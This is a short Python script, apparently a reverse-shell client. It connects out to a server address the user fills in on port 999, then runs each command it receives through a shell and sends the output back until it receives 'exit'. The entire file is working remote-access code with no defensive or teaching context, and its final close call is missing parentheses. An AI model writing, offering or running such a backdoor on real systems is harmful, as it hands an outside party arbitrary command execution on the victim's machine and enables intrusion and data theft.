import socket
import subprocess

ip = "" # <<< enter your server ip here
port = 999 #default port, (you can change it)
socket1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socket1.connect((ip, port))
while True:
    command = socket1.recv(4096).decode("utf-8")
    if command == "exit":
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    socket1.sendall(output.stdout + output.stderr)
socket1.close
